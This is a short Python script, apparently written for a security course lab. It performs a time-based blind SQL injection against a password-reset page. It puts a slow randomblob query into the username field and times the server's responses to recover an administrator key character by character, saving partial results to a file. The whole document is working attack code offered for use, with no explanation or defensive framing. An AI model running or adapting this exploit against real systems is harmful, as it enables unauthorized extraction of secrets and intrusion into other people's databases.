#!/bin/python

import urllib as url
import time
import string
import sys

adress = "lbs-course.askarov.net"
port = 3030
page = "reset"

#SQL
injectionStart="admin' and substr(key,"
slowQuery = " and length(hex(randomblob(9999999)))"
injectionEnd = ";--"

maxDelay = 0.2
fileName = "keySoFar_substr.txt"

keyChars = list("\n +-/"+string.digits+"="+string.ascii_uppercase+string.ascii_lowercase)

def encode(key):
    injection = injectionStart + "'" +key+"'" + slowQuery + injectionEnd
    #print(injection)
    return url.urlencode({'username': injection})

def queryOnce(index,size,key):
    injection = encode(str(index)+","+str(size)+")="+key)
    target = "http://"+adress+":"+str(port)+"/"+page
    
    #print(target)
    start = time.time()
    url.urlopen(target,data=injection)
    end = time.time()
    return end-start

def isCorrect(time):
    return time>maxDelay

def findNextChar(index,currentKey,tries=0):
    print(index,currentKey)
    for i in keyChars:
        duration = queryOnce(index,1,i)
        if isCorrect(duration):
            print(currentKey+i)
            return currentKey+i
    #something went wrong
    if isCorrect(queryOnce(0,len(currentKey)+1,currentKey)):
        print("Cant find next char in this key:\n"+currentKey+"\ntrying again\n")
        if(tries>10):
            print("Tried 10 times and failed, current key is:\n"+currentKey)
            writeToFile(currentKey)
            sys.exit()
        else:
            return findNextChar(index,currentKey,tries=tries+1)
    else:
        print("Incorrect key accepted once:\n"+currentKey)
        if currentKey!='':
            return findNextChar(index-1,currentKey[:-1])

def writeToFile(key):
    if key==None:
        return
    print('writing '+ str(len(key))+' characters to file')
    f = open(fileName,'w')
    f.write(key)
    f.close()

def main():
    f = open(fileName,'r')
    key = f.read()
    f.close()
    offset = len(key)+1
    for i in range(offset,3508):
        key = findNextChar(offset+i,key)
        if i%10==0:
            writeToFile(key)
    writeToFile(key)
    return

if __name__ == "__main__":
    main()
